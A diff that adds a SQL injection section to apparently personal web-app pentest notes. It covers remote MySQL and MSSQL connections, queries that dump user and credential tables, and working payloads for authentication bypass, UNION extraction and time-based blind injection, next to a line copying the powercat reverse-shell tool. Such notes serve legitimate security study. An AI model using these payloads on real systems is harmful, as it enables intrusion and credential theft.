@@ -9,6 +9,36 @@ Web App Pentest
         cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
 
 
+  SQLi
+    MySQL:
+      connect to mysql remotely:
+        mysql -u <user> -h <ip> -P 3306 -p;
+      commands after connection:
+        show databases;
+        select version();
+        show tables in mysql;
+        select * from mysql.user;
+        select * from mysql.user where user = 'username';
+    MSSQL:
+      connect:
+        impacket-mssqlclient <user>:<pass>@<ip> -windows-auth
+      commnads:
+        select @@version;
+        select name from sys.databases;
+        select * from <db_name>.information_schema.tables;
+        select * from master.dbo.sysusers;
+
+    Injections: 
+      offsec' OR 1=1 -- //
+      if above successful:
+            ' or 1=1 in (select @@version) -- //
+    UNION injections:
+      first get number of columns (increase number by 1):
+        ' ORDER BY 1-- //
+        ' UNION SELECT null, null, database(), user(), @@version  -- //
+        ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+    Time Based Blind SQL:
+      ' AND IF (1=1, sleep(3),'false') -- //
 
 
 
